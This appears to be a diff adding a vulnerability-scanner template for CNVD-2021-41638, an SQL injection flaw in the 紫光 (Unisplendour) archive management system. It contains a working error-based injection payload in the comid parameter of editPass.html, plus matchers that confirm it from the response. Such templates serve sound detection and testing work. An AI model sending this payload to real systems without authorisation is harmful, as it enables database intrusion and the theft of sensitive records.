@@ -1,0 +1,27 @@
+id: CNVD-2021-41638
+
+info:
+  name: 紫光档案管理系统 editPass.html SQL注入
+  author: peiqi0
+  severity: high
+  description: |
+    紫光软件系统有限公司（以下简称“紫光软件”）是中国领先的行业解决方案和IT服务提供商。 紫光电子档案管理系统存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息
+    app="紫光档案管理系统"
+  tags: 紫光档案管理系统
+
+flow: |
+  http("r0")
+
+http:
+  - id: "r0"
+    raw:
+      - |
+        GET /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1))) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"c4ca4238a0b923820dcc509a6f75849") && contains(body,"XPATH syntax error:")
+        condition: and
+
